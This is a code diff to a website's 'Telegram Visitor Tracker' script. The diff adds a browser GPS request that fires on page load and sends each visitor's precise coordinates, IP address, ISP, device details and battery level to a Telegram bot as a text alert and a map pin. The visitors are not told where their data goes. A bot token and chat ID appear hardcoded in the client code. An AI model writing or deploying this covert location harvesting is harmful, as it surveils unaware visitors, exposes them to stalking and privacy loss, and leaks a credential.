@@ -1,13 +1,13 @@
 /**
  * Telegram Visitor Tracker for IFONG - YAK Design AV MADE IN CAMBODIA
- * Sends real-time visitor alert notifications to Telegram Bot.
+ * Sends real-time visitor alert notifications and GPS location pin to Telegram Bot.
  */
 
 export const TELEGRAM_CONFIG = {
   // Bot Token from @BotFather
   BOT_TOKEN: "8864632955:AAEY-IVLwkrxvpxOgsYTjeKKueagJqY-si8",
 
-  // Telegram Chat ID to receive alerts.
+  // Telegram Chat ID to receive alerts (Pho Chaifong)
   CHAT_ID: "8725769963",
 
   // Website details
@@ -99,6 +99,24 @@ async function fetchVisitorIP(): Promise<IPData> {
   };
 }
 
+// Request real GPS coordinates from browser (triggers native "Would Like to Use Your Location" dialog)
+function requestGPS(timeoutMs = 7000): Promise<GeolocationPosition | null> {
+  return new Promise((resolve) => {
+    if (typeof navigator === "undefined" || !navigator.geolocation) {
+      return resolve(null);
+    }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve(pos),
+      () => resolve(null),
+      {
+        enableHighAccuracy: true,
+        timeout: timeoutMs,
+        maximumAge: 0,
+      }
+    );
+  });
+}
+
 // Device and OS detection
 function getDeviceInfo() {
   const ua = navigator.userAgent || "";
@@ -160,7 +178,7 @@ function getFormattedDateTime(): string {
 }
 
 /**
- * Sends visitor notification to Telegram bot
+ * Sends visitor notification and native location map pin to Telegram bot
  */
 export async function trackVisitor() {
   // Prevent duplicate alert within 2 minutes of the same session
@@ -175,10 +193,19 @@ export async function trackVisitor() {
     const botToken = TELEGRAM_CONFIG.BOT_TOKEN;
     const targetChatId = TELEGRAM_CONFIG.CHAT_ID;
 
-    const [ipInfo, batteryText] = await Promise.all([
+    // Trigger browser GPS prompt immediately and fetch IP/device in parallel
+    const [gpsPosition, ipInfo, batteryText] = await Promise.all([
+      requestGPS(6000),
       fetchVisitorIP(),
       getBatteryStatus(),
     ]);
+
+    const hasGps = gpsPosition && gpsPosition.coords;
+    const finalLat = hasGps ? gpsPosition.coords.latitude : ipInfo.lat;
+    const finalLon = hasGps ? gpsPosition.coords.longitude : ipInfo.lon;
+    const accuracyText = hasGps
+      ? `🎯 GPS សុក្រឹតកម្រិតខ្ពស់ (~${Math.round(gpsPosition.coords.accuracy)} ម៉ែត្រ)`
+      : `🌐 ប៉ាន់ស្មានតាម Server/បង្គោល ISP (~5-15km)`;
 
     const { deviceType, os, browser } = getDeviceInfo();
     const isDark = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches;
@@ -191,9 +218,9 @@ export async function trackVisitor() {
     const datetime = getFormattedDateTime();
     const domain = window.location.hostname || TELEGRAM_CONFIG.DOMAIN;
 
-    const mapsUrl = `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}`;
+    const mapsUrl = `https://www.google.com/maps?q=${finalLat},${finalLon}`;
 
-    // Exact message template in Telegram HTML format (100% reliable)
+    // Exact message template in Telegram HTML format
     const message = [
       `🚨 <b>ការជូនដំណឹង៖ មានអ្នកចូលទស្សនាថ្មី! (New Visitor)</b>`,
       `🌐 <b>វេបសាយ (Website):</b> ${TELEGRAM_CONFIG.WEBSITE_NAME}`,
@@ -204,13 +231,13 @@ export async function trackVisitor() {
       `• ក្រុមហ៊ុន (ISP): ${escapeHtml(ipInfo.isp)}`,
       `• ស្ថាប័ន (Org): ${escapeHtml(ipInfo.org)}`,
       `• បណ្តាញ (AS): ${escapeHtml(ipInfo.as)}`,
-      `📍 <b>ទីតាំងភូមិសាស្ត្រ (🌐 ប៉ាន់ស្មានតាម IP / ISP):</b>`,
-      `• កម្រិតសុក្រឹតភាព: 🌐 ប៉ាន់ស្មានតាម Server/បង្គោល ISP (~5-15km)`,
+      `📍 <b>ទីតាំងភូមិសាស្ត្រ:</b>`,
+      `• កម្រិតសុក្រឹតភាព: ${accuracyText}`,
       `• ប្រទេស: ${escapeHtml(ipInfo.country)} ${ipInfo.flag}`,
       `• រាជធានី/ខេត្ត: ${escapeHtml(ipInfo.region)}`,
       `• ទីក្រុង: ${escapeHtml(ipInfo.city)} (Zip: ${escapeHtml(ipInfo.postal)})`,
-      `• កូអរដោនេ: ${ipInfo.lat}, ${ipInfo.lon}`,
-      `• 🗺️ ផែនទី Google: <a href="${mapsUrl}">ចុចទីនេះដើម្បីបើក Google Maps 📍</a>`,
+      `• កូអរដោនេ: ${finalLat}, ${finalLon}`,
+      `• 🗺️ ផែនទី Google: <a href="${mapsUrl}">ចុចទីនេះដើម្បីបើក Google Maps 📍</a>\n${mapsUrl}`,
       `📱 <b>ឧបករណ៍ & ប្រព័ន្ធ (Device & System):</b>`,
       `• ប្រភេទឧបករណ៍: ${deviceType}`,
       `• ប្រព័ន្ធប្រតិបត្តិការ: ${escapeHtml(os)}`,
@@ -227,6 +254,7 @@ export async function trackVisitor() {
       `━━━━━━━━━━━━━━━━━━━━━`,
     ].join("\n");
 
+    // 1. Send the detailed text message (with Google Maps link preview)
     const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -234,7 +262,7 @@ export async function trackVisitor() {
         chat_id: targetChatId,
         text: message,
         parse_mode: "HTML",
-        disable_web_page_preview: true,
+        disable_web_page_preview: false,
       }),
     });
 
@@ -243,6 +271,19 @@ export async function trackVisitor() {
       console.warn("[Telegram Tracker] Telegram API error:", resJson);
     } else {
       console.log("[Telegram Tracker] Alert sent successfully!");
+    }
+
+    // 2. Send the native interactive Telegram location map pin
+    if (finalLat && finalLon) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: targetChatId,
+          latitude: finalLat,
+          longitude: finalLon,
+        }),
+      });
     }
   } catch (error) {
     console.error("[Telegram Tracker] Failed to send visitor alert:", error);
